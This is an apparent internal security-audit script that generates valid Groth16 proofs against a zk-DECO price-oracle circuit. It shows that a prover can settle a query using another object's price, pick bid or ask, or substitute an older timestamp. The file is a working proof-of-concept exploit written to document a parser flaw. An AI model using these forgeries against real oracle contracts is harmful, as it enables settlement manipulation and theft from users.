// PHASE 8 AUDIT — ZD-1: the zk-DECO circuit does not bind `price` / `ts` to the object that carries `"symbol"`.
// Every claim below is a REAL Groth16 proof (dev keys) that the on-chain verifier would accept, built from a
// notarisable 96-byte body. Run from circuits/:  node audit/zkdeco_crossfield.mjs
import * as snarkjs from "snarkjs";
import { readFileSync } from "node:fs";
import { init, stringify, rand } from "../test/lib.mjs";

const WASM = "build/zkdeco_oracle/zkdeco_oracle_js/zkdeco_oracle.wasm";
const ZKEY = "build/zkdeco_oracle/zkdeco_oracle.zkey";
const VKEY = JSON.parse(readFileSync("build/zkdeco_oracle/zkdeco_oracle.vkey.json", "utf8"));
const BODY_LEN = 96, CHUNK = 24;
const h = await init();
const bytes = (s) => [...Buffer.from(s, "latin1")];
const pack = (arr) => arr.reduce((a, b, i) => a + (BigInt(b) << BigInt(8 * i)), 0n);
const scale = (s) => { const [i, f] = s.split("."); return BigInt(i + f) * 10n ** BigInt(18 - f.length); };

/** Claim: hidden symbol `sym`, price taken from the `nthPrice`-th `"price":` and ts from the `nthTs`-th `"ts":`. */
function claim(bodyStr, sym, nthPrice, nthTs) {
  if (bodyStr.length > BODY_LEN) throw new Error(`body is ${bodyStr.length} > ${BODY_LEN} bytes`);
  const body = bytes(bodyStr); while (body.length < BODY_LEN) body.push(0);
  const nth = (needle, n) => { let at = -1; for (let k = 0; k <= n; k++) at = bodyStr.indexOf(needle, at + 1); return at; };
  const offPriceKey = nth('"price":', nthPrice), offTsKey = nth('"ts":', nthTs);
  const priceStr = bodyStr.slice(offPriceKey + 8).match(/^([0-9]+\.[0-9]+)/)[1];
  const tsStr = bodyStr.slice(offTsKey + 5, offTsKey + 15);
  const salt = rand();
  return {
    providerId: 12345n,
    queryCommitment: h(pack(bytes(sym)), salt),
    price: scale(priceStr),
    observedAt: BigInt(tsStr),
    bodyCommitment: h(...Array.from({ length: BODY_LEN / CHUNK }, (_, j) => pack(body.slice(j * CHUNK, (j + 1) * CHUNK)))),
    body, symbol: bytes(sym), salt,
    offSymKey: bodyStr.indexOf(`"symbol":"${sym}"`), offPriceKey, offTsKey,
    intLen: priceStr.split(".")[0].length, fracLen: priceStr.split(".")[1].length,
    _show: { priceStr, tsStr },
  };
}

async function prove(name, input) {
  const show = input._show; delete input._show;
  const { proof, publicSignals } = await snarkjs.groth16.fullProve(stringify(input), WASM, ZKEY);
  const ok = await snarkjs.groth16.verify(VKEY, publicSignals, proof);
  console.log(`${ok ? "ACCEPTED" : "rejected"}  ${name}\n          proves price=${show.priceStr} observedAt=${show.tsStr} for the hidden query`);
  return ok;
}

let forged = 0;
// (a) multi-instrument body: prove XAUUSD's queryCommitment with XAGUSD's price (gold settled at the silver price)
const MULTI = '{"symbol":"XAUUSD","price":2345.60,"ts":1767225600,"x":{"symbol":"XAGUSD","price":29.10}}';
console.log(`body (a) [${MULTI.length} B]: ${MULTI}`);
if (await prove("(a) XAUUSD query, price from the XAGUSD object", claim(MULTI, "XAUUSD", 1, 0))) forged++;
// (b) bid/ask/last body: the prover picks whichever of three prices suits them (a free option)
const BOOK = '{"symbol":"XAUUSD","bid":{"price":2340.10},"ask":{"price":2351.30},"ts":1767225600}';
console.log(`body (b) [${BOOK.length} B]: ${BOOK}`);
if (await prove("(b) bid chosen", claim(BOOK, "XAUUSD", 0, 0))) forged++;
if (await prove("(b) ask chosen", claim(BOOK, "XAUUSD", 1, 0))) forged++;
// (c) a nested older timestamp: SyntheticRWA keeps the EARLIEST observedAt, so an earlier `ts` from another object
//     overrides the canonical settlement (and the price may come from that other object too)
const HIST = '{"symbol":"XAUUSD","price":2345.60,"ts":1767225600,"prev":{"price":2290.00,"ts":1767225000}}';
console.log(`body (c) [${HIST.length} B]: ${HIST}`);
if (await prove("(c) previous price + previous ts", claim(HIST, "XAUUSD", 1, 1))) forged++;
console.log(`\n${forged} cross-object claims produced valid proofs (expected 0 for a sound parser).`);
process.exit(forged > 0 ? 0 : 1);
